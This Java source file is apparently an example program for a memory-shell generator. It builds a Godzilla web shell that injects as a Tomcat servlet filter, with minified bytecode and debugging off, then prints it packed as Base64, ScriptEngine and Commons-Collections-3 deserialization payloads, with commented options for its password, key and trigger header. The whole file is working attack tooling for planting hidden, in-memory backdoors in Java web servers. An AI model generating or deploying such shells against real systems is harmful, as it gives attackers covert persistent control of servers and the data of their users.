package com.reajason.javaweb;

import com.reajason.javaweb.memshell.*;
import com.reajason.javaweb.memshell.config.GenerateResult;
import com.reajason.javaweb.memshell.config.GodzillaConfig;
import com.reajason.javaweb.memshell.config.InjectorConfig;
import com.reajason.javaweb.memshell.config.ShellConfig;

/**
 * @author ReaJason
 * @since 2025/4/6
 */
public class Godzilla {
    public static void main(String[] args) {
        ShellConfig shellConfig = ShellConfig.builder()
                .server(Server.Tomcat)
                .shellTool(ShellTool.Godzilla)
                .shellType(ShellType.FILTER)
                .shrink(true) // 缩小字节码
                .debug(false) // 关闭调试
                .build();

        InjectorConfig injectorConfig = InjectorConfig.builder()
//                .urlPattern("/*")  // 自定义 urlPattern，默认就是 /*
//                .shellClassName("com.example.memshell.GodzillaShell") // 自定义内存马类名，默认为空时随机生成
//                .injectorClassName("com.example.memshell.GodzillaInjector") // 自定义注入器类名，默认为空时随机生成
                .build();

        GodzillaConfig godzillaConfig = GodzillaConfig.builder()
//                .pass("pass")
//                .key("key")
//                .headerName("User-Agent")
//                .headerValue("test")
                .build();

        GenerateResult result = MemShellGenerator.generate(shellConfig, injectorConfig, godzillaConfig);

        System.out.println("注入器类名：" + result.getInjectorClassName());
        System.out.println("内存马类名：" + result.getShellClassName());

        System.out.println(result.getShellConfig());
        System.out.println(result.getShellToolConfig());

        System.out.println("Base64 打包：" + Packers.Base64.getInstance().pack(result));

        System.out.println("脚本引擎打包：" + Packers.ScriptEngine.getInstance().pack(result));

        System.out.println("CC3 打包：" + Packers.JavaCommonsCollections3.getInstance().pack(result));
    }
}
